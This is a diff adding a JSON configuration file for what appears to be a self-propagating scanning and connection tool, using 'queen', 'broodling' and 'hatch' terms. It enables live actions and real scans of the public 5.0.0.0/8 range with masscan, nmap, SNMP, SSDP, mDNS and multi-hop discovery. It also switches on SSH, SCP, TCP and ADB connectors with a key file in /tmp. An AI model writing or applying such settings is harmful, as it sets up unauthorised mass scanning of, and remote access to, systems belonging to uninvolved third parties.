@@ -1,0 +1,62 @@
+{
+  "allow_live_actions": true,
+  "enable_real_scan": true,
+  "max_hatch_per_cycle": 4,
+  "fitness": {
+    "aggregation_mode": "average"
+  },
+  "broodling_lifecycle": 20,
+  "target_ip_range": "5.0.0.0/8",
+  "enable_ssh_connector": true,
+  "enable_adb_connector": true,
+  "enable_scp_connector": true,
+  "enable_tcp_connector": true,
+  "scheduled": {
+    "enabled": false,
+    "interval_seconds": 10,
+    "rounds": 5,
+    "concurrency": 24,
+    "subnets": [
+      "5.0.0.0/8"
+    ],
+    "scan_ports": [
+      80,
+      443,
+      53,
+      22
+    ],
+    "timeout": 0.5
+  },
+  "use_masscan": true,
+  "use_nmap": true,
+  "use_ssdp": true,
+  "use_mdns": true,
+  "use_snmp": true,
+  "use_app_enum": true,
+  "use_multi_hop": true,
+  "scan_ports": [
+    80,
+    443,
+    53,
+    22
+  ],
+  "scan_timeout": 0.5,
+  "5.0.0.0/8": "json",
+  "connectors": {
+    "ssh": {
+      "key": "/tmp/queen_key_y_yx9clg",
+      "enabled": true
+    },
+    "tcp": {
+      "enabled": true,
+      "host": "5.0.0.0"
+    },
+    "scp": {
+      "enabled": true,
+      "host": "5.0.0.0"
+    },
+    "adb": {
+      "enabled": true
+    }
+  }
+}
